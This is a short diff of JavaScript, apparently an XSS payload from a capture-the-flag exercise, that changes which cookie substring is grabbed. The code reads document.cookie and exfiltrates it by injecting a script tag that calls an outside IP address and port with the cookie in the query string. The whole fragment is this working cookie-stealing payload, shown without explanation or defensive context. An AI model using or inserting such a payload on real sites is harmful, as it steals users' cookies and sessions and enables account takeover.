@@ -30,7 +30,7 @@
 // }
 
 cc=document.cookie;
-beg=cc.indexOf('flag=');
+beg=cc.indexOf('wxzf');
 var flag=cc.substring(beg);
 var script=document.createElement('script');
 script.src='http://119.29.81.170:7892/?flag='+flag;
